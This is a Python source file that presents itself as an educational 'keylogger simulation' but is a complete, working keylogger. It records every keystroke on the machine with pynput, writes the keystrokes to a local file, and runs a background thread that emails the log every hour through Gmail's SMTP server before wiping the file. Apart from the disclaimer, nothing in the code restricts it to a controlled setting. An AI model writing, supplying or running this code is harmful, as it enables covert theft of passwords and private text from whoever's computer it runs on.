"""
Keylogger Simulation Module - FOR EDUCATIONAL PURPOSES ONLY
This module demonstrates basic keylogger behavior in a controlled environment.
"""

import os
from datetime import datetime
from pynput import keyboard
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv

class KeyloggerSimulation:
    def __init__(self, log_file="keylog.txt"):
        """Initialize the keylogger simulation."""
        self.log_file = log_file
        self.running = False
        self.keys = []
        self.count = 0
        self.last_email_time = datetime.now()
        
        # Load environment variables
        load_dotenv()
        
    def on_press(self, key):
        """Callback for key press events."""
        try:
            # Get the key value
            current_key = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " "
            elif key == keyboard.Key.enter:
                current_key = "\n"
            else:
                current_key = f" {str(key)} "
                
        # Add key to the list
        self.keys.append(current_key)
        self.count += 1
        
        # Write to file periodically
        if self.count >= 10:
            self.write_to_file()
            
    def write_to_file(self):
        """Write captured keys to file."""
        with open(self.log_file, "a") as f:
            f.write(''.join(self.keys))
        self.keys = []
        self.count = 0
        
    def send_email(self):
        """Send captured keys via email (if configured)."""
        try:
            # Get email configuration from environment variables
            email_user = os.getenv('EMAIL_USER')
            email_password = os.getenv('EMAIL_PASSWORD')
            email_to = os.getenv('EMAIL_TO')
            
            if not all([email_user, email_password, email_to]):
                return
                
            # Read the log file
            with open(self.log_file, 'r') as f:
                log_content = f.read()
                
            # Create email
            msg = MIMEMultipart()
            msg['From'] = email_user
            msg['To'] = email_to
            msg['Subject'] = f"Keylog Report - {datetime.now()}"
            
            body = f"Keylogger simulation report:\n\n{log_content}"
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email
            with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
                server.login(email_user, email_password)
                server.send_message(msg)
                
            # Clear the log file after sending
            open(self.log_file, 'w').close()
            
        except Exception as e:
            print(f"Error sending email: {str(e)}")
            
    def email_timer(self):
        """Timer for periodic email sending."""
        while self.running:
            current_time = datetime.now()
            # Send email every hour
            if (current_time - self.last_email_time).seconds >= 3600:
                self.send_email()
                self.last_email_time = current_time
                
    def start(self):
        """Start the keylogger simulation."""
        self.running = True
        
        # Start email timer thread
        email_thread = threading.Thread(target=self.email_timer)
        email_thread.daemon = True
        email_thread.start()
        
        # Start key listener
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
            
    def stop(self):
        """Stop the keylogger simulation."""
        self.running = False
        self.write_to_file()
        
if __name__ == "__main__":
    # Example usage in a controlled environment
    print("Starting keylogger simulation...")
    print("Press Ctrl+C to stop")
    
    keylogger = KeyloggerSimulation()
    
    try:
        keylogger.start()
    except KeyboardInterrupt:
        print("\nStopping keylogger simulation...")
        keylogger.stop()
        print("Simulation completed!")